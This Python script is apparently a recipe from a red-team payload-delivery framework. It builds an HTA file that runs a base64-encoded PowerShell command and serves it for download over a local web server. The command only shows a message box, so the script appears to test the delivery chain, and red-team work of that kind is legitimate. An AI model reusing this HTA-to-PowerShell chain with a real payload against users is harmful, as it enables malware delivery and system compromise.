from make.htmlsmuggling.htmlsmuggling import makeHtmlSmuggling
from make.lnk.lnk import makeLnk
from make.iso.iso import makeIso
from make.powershell.powershell import *
from make.zip.zip import makeZip
from make.vbs.vbs import *
from make.hta.hta import *
from make.onenote.onenote import *
from make.bat.bat import *

from helpers import readFileContent, saveAceFile, makeAceFile
from model import AceFile, AceRoute
from web import serve


def recipe():
    # MSHTA -> Powershell:MessageBox
    routes = []

    ps1msgbox: AceStr = makePsScriptMessagebox()
    ps1msgbox: AceStr = makePsEncodedCommand(ps1msgbox)
    cmd: AceStr = AceStr("powershell.exe -EncodedCommand {}".format(ps1msgbox))
    hta: AceStr = makeHtaFromCmdByJscriptWscript(cmd)
    containerServe: AceRoute = AceRoute('/test.hta', hta, download=True, downloadName='test.hta')
    routes.append(containerServe)
    serve(routes)


if __name__ == "__main__":
    recipe()
